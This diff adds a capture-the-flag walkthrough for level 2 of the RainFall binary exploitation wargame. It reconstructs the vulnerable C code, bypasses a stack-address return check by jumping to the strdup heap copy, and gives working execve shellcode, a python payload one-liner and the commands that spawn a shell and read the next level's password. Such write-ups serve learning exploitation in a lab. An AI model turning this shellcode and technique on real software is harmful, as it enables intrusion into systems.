@@ -1,0 +1,83 @@
+# Level 2 — Heap-Based Shellcode Execution
+
+## Introduction
+This level builds on the stack overflow concept but introduces a protection mechanism: a filter on the return address. If the return address points to the stack, the program terminates immediately. To bypass this, we must execute shellcode from the heap.
+
+## Analysis
+The reconstructed C code of the binary is:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+void p(void) {
+    unsigned int unaff_retaddr;
+    char local_50[76];
+    
+    fflush(stdout);
+    gets(local_50);
+    
+    // Protection: checks if return address points to the stack (0xbxxxxxxx)
+    if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
+        printf("(%p)\n", (void *)unaff_retaddr);
+        _exit(1);
+    }
+    
+    puts(local_50);
+    strdup(local_50); // Duplicates input on the heap
+}
+
+int main(void) {
+    p();
+    return 0;
+}
+```
+
+### The Filter and Bypassing Strategy
+The check `if ((unaff_retaddr & 0xb0000000) == 0xb0000000)` prevents the return address from pointing to the stack (since stack addresses in 32-bit Linux generally begin with `0xb`). 
+
+However, the program calls `strdup(local_50)`, which copies our input buffer to a newly allocated block on the heap. Heap addresses generally begin with `0x08`, meaning they are not filtered. 
+
+Our strategy is:
+1. Embed shellcode at the beginning of our input buffer.
+2. Duplicate this buffer to the heap using the program's call to `strdup`.
+3. Overwrite the return address of `p` to point to the heap address returned by `strdup`.
+
+### Finding the Heap Address
+We run `ltrace` on `./level2` to see where `strdup` allocates our buffer:
+```bash
+level2@RainFall:~$ ltrace ./level2
+...
+gets(0xbffff70c) = 0xbffff70c
+puts("") = 1
+strdup("") = 0x0804a008
+```
+
+The heap address allocated for our input is `0x0804a008`.
+
+### Finding the Offset
+We need to determine the distance between our buffer start and the saved return address (EIP).
+By feeding a 200-byte pattern to `gets` inside `gdb`, the program crashes at `0x37634136` (which corresponds to an offset of 80 bytes).
+
+### Crafting the Payload
+- **Shellcode (21 bytes):**
+  `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`
+- **Padding:** 59 bytes of `A` (80 - 21 = 59) to reach the return address offset.
+- **Return Address:** `0x0804a008` (little-endian: `\x08\xa0\x04\x08`).
+
+## Exploit
+We generate the payload:
+```bash
+python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08"' > /tmp/payload
+```
+
+Run the binary using `cat` to keep stdin open:
+```bash
+(cat /tmp/payload; cat) | ./level2
+```
+
+Once the shell is spawned, we retrieve the password for `level3`:
+```bash
+cat /home/user/level3/.pass
+```
